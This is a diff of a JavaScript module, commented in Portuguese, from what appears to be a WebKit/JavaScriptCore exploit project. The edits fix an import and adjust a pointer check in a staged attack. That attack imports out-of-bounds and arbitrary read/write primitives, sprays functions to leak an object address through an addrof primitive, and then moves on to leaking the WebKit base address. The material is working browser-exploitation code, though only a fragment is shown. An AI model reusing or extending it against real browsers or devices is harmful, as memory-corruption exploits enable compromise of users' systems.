@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Revisão 45 - Estratégia de Exploração em Estágios)
+// js/script3/testArrayBufferVictimCrash.mjs (Revisão 45.2 - Correção de Import OOB_CONFIG)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -7,13 +7,14 @@ import {
     clearOOBEnvironment,
     arb_read,
     arb_write,
-    oob_read_absolute,
     oob_write_absolute,
     isOOBReady,
     selfTestOOBReadWrite,
-    oob_dataview_real, // NOVO: Importa a referência ao dataview
+    oob_dataview_real,
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+
+// CORREÇÃO: OOB_CONFIG também precisa ser importado de config.mjs.
+import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';
 
 function isValidPointer(ptr, context = "") {
     if (!isAdvancedInt64Object(ptr)) return false;
@@ -21,13 +22,12 @@ function isValidPointer(ptr, context = "") {
     const low = ptr.low();
     if (high === 0 && low === 0) return false;
     if ((high & 0x7FF00000) === 0x7FF00000) return false; // NaN/Infinity
-    if (high === 0) return false; // Nenhum ponteiro válido em firmwares de 64 bits estará na faixa de 32 bits.
+    if (high < 0x1000) return false; // Exclui ponteiros em endereços muito baixos, comuns em firmwares de 64 bits.
     return true;
 }
 
 // ======================================================================================
 // ESTRATÉGIAS ANTIGAS (R43, R44) - MANTIDAS PARA REFERÊNCIA
-// O código para R43 e R44 permanece aqui, mas não é mais o foco principal.
 // ======================================================================================
 export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "DEPRECATED_Heisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";
 export const FNAME_MODULE_CALLFRAME_ADDROF_R44 = "DEPRECATED_CallFrameVictim_Addrof_R44_WebKitLeak";
@@ -54,11 +54,6 @@ function spray_functions_R45() {
 function find_leaked_object_address_R45() {
     if (!isOOBReady()) throw new Error("Ambiente OOB não está pronto para o escaneamento.");
     
-    // O StructureID de uma JSFunction é um bom marcador.
-    // Este valor pode precisar de ajuste/descoberta. Vamos usar um placeholder.
-    // Um bom candidato é o StructureID de um objeto simples, pois a função também é um objeto.
-    // Vamos supor que o StructureID de uma função seja 0x01082307 (exemplo, precisa ser validado).
-    // O que podemos procurar com mais certeza é o ponteiro para a Scope, que não deve ser nulo.
     const FUNCTION_EXECUTABLE_OFFSET = JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET; // 0x18
     const FUNCTION_SCOPE_OFFSET = JSC_OFFSETS.JSFunction.SCOPE_OFFSET;       // 0x20
 
@@ -110,10 +105,6 @@ export async function executeStagedLeak_R45() {
         logS3(`[R45] Primitiva 'addrof' bem-sucedida! Endereço vazado: ${result.leaked_addr}`, "vuln");
 
         // --- Estágio B: Ativar Leitura/Escrita Arbitrária ---
-        // A primitiva arb_read/arb_write já está funcional porque se baseia na corrupção
-        // do m_vector, que é independente de ter o endereço de um objeto.
-        // Se ela não estivesse funcional, este seria o momento de "atualizá-la".
-        // Como o selfTest já passou, podemos pular esta etapa de reconfiguração.
         logS3(`[R45] Estágio B: Primitivas 'arb_read/write' já ativas.`, 'good');
 
         // --- Estágio C: Vazar a Base do WebKit ---
